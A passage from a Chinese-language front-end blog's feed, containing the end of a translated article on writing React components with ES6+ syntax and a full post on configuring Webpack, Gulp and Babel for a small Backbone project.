<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Form</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</div><div class="line">  onChange(inputName, e) &#123;</div><div class="line">    <span class="keyword">this</span>.setState(&#123;</div><div class="line">      [<span class="string">`<span class="subst">$&#123;inputName&#125;</span>Value`</span>]: e.target.value,</div><div class="line">    &#125;);</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="Destructuring-amp-spread-attributes-解构-amp-属性"><a href="#Destructuring-amp-spread-attributes-解构-amp-属性" class="headerlink" title="Destructuring &amp; spread attributes (解构 &amp; 属性)"></a>Destructuring &amp; spread attributes (解构 &amp; 属性)</h2><p>当我们编写组件时，我们可能需要把大部分父组件值传递给子组件，而不是全部。在结合ES6+<a href="https://babeljs.io/docs/learn-es2015/#destructuring" target="_blank" rel="external">解构</a>与JSX的<a href="https://facebook.github.io/react/docs/jsx-spread.html" target="_blank" rel="external">延展属性</a>，将可能很轻松地实现:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">AutoloadingPostsGrid</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</div><div class="line">  render() &#123;</div><div class="line">    <span class="keyword">var</span> &#123;</div><div class="line">      className,</div><div class="line">      ...others,  <span class="comment">// 包含this.props除了className外的所有属性</span></div><div class="line">    &#125; = <span class="keyword">this</span>.props;</div><div class="line">    <span class="keyword">return</span> (</div><div class="line">      <span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&#123;className&#125;</span>&gt;</span></span></div><div class="line">        <span class="tag">&lt;<span class="name">PostsGrid</span> &#123;<span class="attr">...others</span>&#125; /&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;this.handleLoadMoreClick&#125;</span>&gt;</span>Load more<span class="tag">&lt;/<span class="name">button</span>&gt;</span></div><div class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">    );</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>我们也可以结合JSX的常规属性与延展属性，利用简单的优先原则去实现覆盖与默认。这个div将得到<code>className</code>“override”即使在<code>this.props</code>中存在属性名称<code>className</code>:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">div</span> &#123;<span class="attr">...this.props</span>&#125; <span class="attr">className</span>=<span class="string">"override"</span>&gt;</span></div><div class="line">  …</div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div></pre></td></tr></table></figure>
<p>这个div按常理来讲应该拥有<code>className</code>“base”，除非在<code>this.props</code>中存在属性名称<code>className</code>去覆盖它:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">"base"</span> &#123;<span class="attr">...this.props</span>&#125;&gt;</span></div><div class="line">  …</div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div></pre></td></tr></table></figure>
<h2 id="Thanks-for-reading-感谢阅读"><a href="#Thanks-for-reading-感谢阅读" class="headerlink" title="Thanks for reading (感谢阅读)"></a>Thanks for reading (感谢阅读)</h2><p>我希望你能像我们一样享受ES6+语法特性来构建React的代码。感谢我的同事为这篇文章做出的贡献，特别感谢Babel团队为我们所有人构建一些未来js的特性。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;原文地址: &lt;a href=&quot;http://babeljs.io/blog/2015/06/07/react-on-es6-plus&quot;&gt;http://babeljs.io/blog/2015/06/07/react-on-es6-plus&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;这是一篇来自Steven Luscher的特邀文章，Steven在Facebook从事于Relay的开发，一个javascript框架使用React与GraphQL用来构建应用。在&lt;a href=&quot;https://instagram.com/steveluscher/&quot;&gt;Instagram&lt;/a&gt;，&lt;a href=&quot;https://github.com/steveluscher&quot;&gt;GitHub&lt;/a&gt;和&lt;a href=&quot;https://twitter.com/steveluscher&quot;&gt;Twitter&lt;/a&gt;关注Steven。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;当我们今年重构&lt;a href=&quot;https://instagram.com/instagram/&quot;&gt;Instagram Web&lt;/a&gt;时，更加热衷于使用一些ES6+的新特性来构建React组件。请允许我强调一些新特性来改变你构建React应用的方法，让它变得更加简单与有趣。&lt;/p&gt;
    
    </summary>
    
      <category term="React全家桶" scheme="http://blackganglion.com/categories/React%E5%85%A8%E5%AE%B6%E6%A1%B6/"/>
    
    
      <category term="React" scheme="http://blackganglion.com/tags/React/"/>
    
  </entry>
  
  <entry>
    <title>Webpack + Gulp + Babel, No React!</title>
    <link href="http://blackganglion.com/2016/01/07/Webpack-Gulp-Babel-No-React/"/>
    <id>http://blackganglion.com/2016/01/07/Webpack-Gulp-Babel-No-React/</id>
    <published>2016-01-06T17:29:00.000Z</published>
    <updated>2016-07-08T15:51:19.000Z</updated>
    
    <content type="html"><![CDATA[<p>前端自动化构建一直很火热, 各种工具也层出不穷, 开始有点不以为然, 但使用之后发现确实很方便, 也整理出了一套自己感觉不错的搭配组合, 用 <strong>Webpack</strong> 来处理js, 用 <strong>Gulp</strong> 来编译与压缩sass, 检查与压缩js, 处理图片等等, 用 <strong>Babel</strong> 来讲es2015转化为es5. 每次 <strong>Babel</strong> 与 <strong>Webpack</strong> 组合时, 网上资料无不扯上 <strong>React</strong>, 我感觉这一块一直是一个小痛点吧。当然基于 <strong>Babel</strong> + <strong>Webpack</strong> + <strong>ES6+</strong> 的 <strong>React</strong> 确实很优雅, 最近正在努力学习, 下一篇博文分享吧。</p>
<a id="more"></a>
<h2 id="Webpack"><a href="#Webpack" class="headerlink" title="Webpack"></a><a href="http://webpack.github.io" target="_blank" rel="external">Webpack</a></h2><p><a href="https://zhaoda.gitbooks.io/webpack/content/index.html" target="_blank" rel="external">Webpack中文指南 - 可以用来入门</a></p>
<p><a href="https://github.com/ruanyf/webpack-demos" target="_blank" rel="external">Webpack Demo - 阮一峰老师</a></p>
<p>Webpack主要特点在于前端资源模块化管理和打包功能, 这样我们就可以像node那样使用模块的方式去书写我们的前端代码了, 使用npm包, 可以将你的js适当模块化分解, 暴露相应接口.</p>
<p>当然先不要忘了全局安装:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ npm install webpack -g</div></pre></td></tr></table></figure>
<h2 id="Gulp"><a href="#Gulp" class="headerlink" title="Gulp"></a><a href="http://gulpjs.com" target="_blank" rel="external">Gulp</a></h2><p>利用node流以达到快速构建的目的, 具有众多插件, 可以完成以下自动构建工作:</p>
<ul>
<li>编译Sass</li>
<li>压缩css</li>
<li>利用eslint检查js</li>
<li>模糊代码</li>
<li>压缩图片</li>
<li>快速清理</li>
<li>…</li>
</ul>
<p>当然先不要忘了全局安装:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ npm install gulp -g</div></pre></td></tr></table></figure>
<h2 id="Babel"><a href="#Babel" class="headerlink" title="Babel"></a><a href="http://babeljs.io" target="_blank" rel="external">Babel</a></h2><p><a href="http://www.ruanyifeng.com/blog/2016/01/babel.html" target="_blank" rel="external">Babel入门指南 - 阮一峰老师</a></p>
<p>又要安利一发阮一峰老师了, 阮一峰老师的博文确实简明扼要, 使像我一样的小白菜快速掌握</p>
<p>使用babel后, 就可以肆无忌惮地使用许多es6的特性了, 比如es6的模块加载.</p>
<hr>
<p>下面以我做的一个很简单的Backbone小项目来说明以下</p>
<p><a href="https://github.com/BlackGanglion/js-projects/tree/301-submit/301-backbone-clickable-grid/301-backbone" target="_blank" rel="external">backbone-clickable-grid</a></p>
<h2 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">.</div><div class="line">    ├── dist                --- 生产环境静态资源</div><div class="line">    │    ├── css</div><div class="line">    │    ├── js</div><div class="line">    ├── src                 --- 本地环境静态资源</div><div class="line">    │    ├── js</div><div class="line">    │    ├── scss</div><div class="line">    ├── .eslintrc           --- eslint配置文件</div><div class="line">    ├── webpack.config.js   --- webpack配置文件</div><div class="line">    ├── index.html          --- 项目主页</div><div class="line">    └── gulpfile.js         --- gulp配置文件</div></pre></td></tr></table></figure>
<h2 id="gulp配置"><a href="#gulp配置" class="headerlink" title="gulp配置"></a>gulp配置</h2><p>gulp的配置放在gulpfile.js中, 简单介绍一些常用API</p>
<ul>
<li><p>gulp.src(globs[, options]) - 指明需要处理的源文件路径</p>
</li>
<li><p>gulp.dest(path[, options]) - 指明任务处理完成后的输出路径</p>
</li>
<li><p>gulp.task(name [, deps, fn]) - 任务注册, 可以顺序执行, 需要添加依赖</p>
</li>
<li><p>gulp.watch(glob[, opts], tasks) - 监视文件的变化并运行相应的任务</p>
</li>
<li><p>.pipe() - 传递给后续插件</p>
</li>
</ul>
<p>拿以下示例简单说明: </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">gulp.task(<span class="string">'webpack'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="keyword">return</span> gulp.src(<span class="string">'./src/js/main.js'</span>)</div><div class="line">         .pipe(webpack(webpackConfig))</div><div class="line">         .pipe(gulp.dest(<span class="string">'./dist/js/'</span>));</div><div class="line">&#125;);</div><div class="line"><span class="comment">// 在合并，压缩文件前先让webpack处理js文件，然后进行重命名与丑化</span></div><div class="line">gulp.task(<span class="string">'scripts'</span>, [<span class="string">'webpack'</span>], <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    gulp.src(<span class="string">'./dist/js/main.js'</span>)</div><div class="line">        .pipe(rename(<span class="string">'main.min.js'</span>))</div><div class="line">        .pipe(uglify())</div><div class="line">        .pipe(gulp.dest(<span class="string">'./dist/js'</span>));</div><div class="line">&#125;);</div><div class="line"></div><div class="line"><span class="comment">// 从node_modules中迁出需要的js依赖</span></div><div class="line">gulp.task(<span class="string">'buildlib'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">    gulp.src(<span class="string">'./node_modules/backbone/backbone-min.js'</span>)</div><div class="line">        .pipe(gulp.dest(<span class="string">'./dist/js'</span>));</div><div class="line">&#125;);</div><div class="line"></div><div class="line"><span class="comment">// 监听js文件变化</span></div><div class="line">gulp.watch(<span class="string">'./src/js/*.js'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">    gulp.run(<span class="string">'eslint'</span>, <span class="string">'scripts'</span>);</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
<h2 id="webpack配置"><a href="#webpack配置" class="headerlink" title="webpack配置"></a>webpack配置</h2><p>webpack的配置放在webpack.config.js中，由于gulp已经处理了大部分，所以webpack的配置就相对简单了</p>
<h3 id="entry-js文件入口-output-经过处理后的js文件输出"><a href="#entry-js文件入口-output-经过处理后的js文件输出" class="headerlink" title="entry: js文件入口, output: 经过处理后的js文件输出"></a>entry: js文件入口, output: 经过处理后的js文件输出</h3><p>可以多文件输入输出</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">module</span>.exports = &#123;</div><div class="line">  entry: &#123;</div><div class="line">    bundle1: <span class="string">'./main1.js'</span>,</div><div class="line">    bundle2: <span class="string">'./main2.js'</span></div><div class="line">  &#125;,</div><div class="line">  output: &#123;</div><div class="line">    filename: <span class="string">'[name].js'</span></div><div class="line">  &#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<h3 id="module-loader用来处理js"><a href="#module-loader用来处理js" class="headerlink" title="module: loader用来处理js"></a>module: loader用来处理js</h3><p>可以配合babel使用</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">module</span>: &#123;</div><div class="line">  loaders: [</div><div class="line">    &#123;</div><div class="line">      test: <span class="regexp">/\.js$/</span>,</div><div class="line">      exclude: <span class="regexp">/node_modules/</span>,</div><div class="line">      loader: <span class="string">'babel'</span>,</div><div class="line">      query: &#123;</div><div class="line">        presets: [<span class="string">'es2015'</span>, <span class="string">'react'</span>]</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">  ]</div><div class="line">&#125;</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;前端自动化构建一直很火热, 各种工具也层出不穷, 开始有点不以为然, 但使用之后发现确实很方便, 也整理出了一套自己感觉不错的搭配组合, 用 &lt;strong&gt;Webpack&lt;/strong&gt; 来处理js, 用 &lt;strong&gt;Gulp&lt;/strong&gt; 来编译与压缩sass, 检查与压缩js, 处理图片等等, 用 &lt;strong&gt;Babel&lt;/strong&gt; 来讲es2015转化为es5. 每次 &lt;strong&gt;Babel&lt;/strong&gt; 与 &lt;strong&gt;Webpack&lt;/strong&gt; 组合时, 网上资料无不扯上 &lt;strong&gt;React&lt;/strong&gt;, 我感觉这一块一直是一个小痛点吧。当然基于 &lt;strong&gt;Babel&lt;/strong&gt; + &lt;strong&gt;Webpack&lt;/strong&gt; + &lt;strong&gt;ES6+&lt;/strong&gt; 的 &lt;strong&gt;React&lt;/strong&gt; 确实很优雅, 最近正在努力学习, 下一篇博文分享吧。&lt;/p&gt;
    
    </summary>
    
      <category term="前端工程化" scheme="http://blackganglion.com/categories/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96/"/>
    
    
      <category term="Webpack" scheme="http://blackganglion.com/tags/Webpack/"/>
    
  </entry>
  
</feed>
